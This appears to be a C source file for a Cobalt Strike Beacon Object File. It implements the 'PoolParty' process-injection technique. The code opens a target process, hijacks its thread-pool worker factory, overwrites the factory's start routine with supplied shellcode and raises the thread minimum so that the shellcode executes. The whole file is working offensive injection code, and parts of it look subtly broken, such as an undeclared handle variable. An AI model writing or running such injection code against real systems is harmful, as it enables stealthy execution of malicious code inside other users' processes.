#include "PoolParty.h"

void WorkerFactoryStartRoutineOverwrite(HANDLE hTarget, CHAR* shellcode, SIZE_T shellcodeSize) {
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
    _NtSetInformationWorkerFactory NtSetInformationWorkerFactory = (_NtSetInformationWorkerFactory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationWorkerFactory"));

    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation();

    DWORD dwOldProtect = NULL;
    KERNEL32$VirtualProtectEx(hTarget, WorkerFactoryInformation.StartRoutine, shellcodeSize, PAGE_READWRITE, &dwOldProtect);

    NTSTATUS Ntstatus = NtWriteVirtualMemory(hTarget, WorkerFactoryInformation.StartRoutine, shellcode, shellcodeSize, NULL);
    KERNEL32$VirtualProtectEx(hTarget, WorkerFactoryInformation.StartRoutine, shellcodeSize, dwOldProtect, &dwOldProtect);
    ULONG WorkerFactoryMinimumThreadNumber = WorkerFactoryInformation.TotalWorkerCount + 1;

    Ntstatus = NtSetInformationWorkerFactory(hTpWorkerFactory, WorkerFactoryThreadMinimum, &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));

}

void Inject1(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
    HANDLE hTarget = NULL;
    hTarget = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwTargetProcessId);

    if (hTarget) {
        HijackTpWorkerFactoryHandle(hTarget, WORKER_FACTORY_ALL_ACCESS);
        WorkerFactoryStartRoutineOverwrite(hTarget, shellcode, shellcodeSize);
    } else {
          BeaconPrintf(CALLBACK_OUTPUT, "PID %d inaccessible", dwTargetProcessId);
      }
}
